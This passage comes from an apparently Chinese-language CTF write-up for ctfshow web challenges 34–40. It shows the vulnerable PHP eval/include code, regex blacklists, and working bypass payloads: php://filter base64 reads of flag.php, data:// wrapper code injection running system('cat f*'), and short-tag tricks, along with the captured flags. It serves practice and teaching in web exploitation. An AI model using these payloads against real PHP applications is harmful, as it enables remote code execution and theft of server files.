punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤升级，添加了冒号</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>url<span class=\"token punctuation\">]</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>url<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 利用 include 结合伪协议包含读取</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;d0a0ee0e-d7a9-4e57-a1b1-a3d8a313e914&#125;\n</code></pre>\n<h2 id=\"web35\"><a class=\"anchor\" href=\"#web35\">#</a> web35</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 04:21:23</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤升级，添加了 &lt; 和 = 的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>url<span class=\"token punctuation\">]</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>url<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 利用 include 结合伪协议包含读取</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;588e57f9-b27c-4268-832c-ff6e730f463c&#125;\n</code></pre>\n<h2 id=\"web36\"><a class=\"anchor\" href=\"#web36\">#</a> web36</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 04:21:16</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=|\\/|[0-9]/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤升级，添加了 / 和 0-9 的数字</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>url<span class=\"token punctuation\">]</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>url<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 利用 include 结合伪协议包含读取</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;4f3d6214-9a2f-4161-9e22-0b7d499974c9&#125;\n</code></pre>\n<h2 id=\"web37\"><a class=\"anchor\" href=\"#web37\">#</a> web37</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 05:18:55</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//flag in flag.php</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤了 flag，是 include 文件包含</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?c=data://text/plain,<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>//data://可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload2：</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>//base64编码内容是<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code>ctfshow&#123;18f0b970-3518-43ba-bb0b-293ead0fb0e7&#125;\n</code></pre>\n<h2 id=\"web38\"><a class=\"anchor\" href=\"#web38\">#</a> web38</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 05:23:36</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//flag in flag.php</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|php|file/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤升级，添加了 php 和 file 的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>data<span class=\"token punctuation\">:</span><span class=\"token comment\">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;9eb90688-af2b-4954-abbb-87990f68352e&#125;\n</code></pre>\n<h2 id=\"web39\"><a class=\"anchor\" href=\"#web39\">#</a> web39</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 06:13:21</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//flag in flag.php</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>.php 因为前面的 php 语句已经闭合了，所以后面的.php 会被当成 html 页面直接显示在页面上，起不到什么作用，使用短标签绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?c=data://text/plain,<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code>ctfshow&#123;f3b87a5e-30ff-4dbc-a558-0ed3ba514721&#125;\n</code></pre>\n<h2 id=\"web40\"><a class=\"anchor\" href=\"#web40\">#</a> web40</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 06:03:36</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\>|\\/|\\?|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取，正则中的括号不是英文的 是过滤了中文的括号</p>\n<figure class=\"highlight 